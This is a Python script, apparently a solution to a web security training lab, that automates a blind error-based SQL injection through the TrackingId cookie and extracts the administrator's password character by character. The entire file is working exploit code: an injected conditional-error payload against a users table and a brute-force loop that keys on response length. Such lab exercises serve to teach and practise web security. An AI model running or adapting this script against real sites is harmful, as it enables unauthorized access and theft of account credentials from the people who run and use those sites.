#!/usr/bin/python3

"""
	Variables that may need to be modified:
		- username & password
		- pass_length & resp_text_len
		- payload for TrackingId and session
"""

import requests
import sys 


def main(args):

	username = ''
	password = ''
	pass_length = 20 
	chars = '0123456789abcdefghijklmnopqrstuvwxyz'
	url = "https://ac4a1f691f04bbee804f1826001b00ad.web-security-academy.net/filter?category=Gifts" 
	resp_text_len = 21 
	passwd = ""
	
	for i in range(1, pass_length + 1): 
		for c in chars: 
			tracking_id = f"x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{i},1)='{c}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--"  
			session_cookie = 'xECM2rdsPYgpYnLiEUN0MCovzFJ7UDes'
			cookie = "TrackingId={}; session={}".format(tracking_id, session_cookie) 
			print("Trying payload:", cookie)
			headers = {'Cookie': cookie}   
			session = requests.Session()
			r = session.get(url, headers=headers, auth=(username, password))
			
			if len(r.text) == resp_text_len:
				print(f'[+] Password char found: {c}')
				passwd += c
	print(f'The password for administrator is: {passwd}')
	
if __name__ == '__main__':
	main(sys.argv[1:])
	

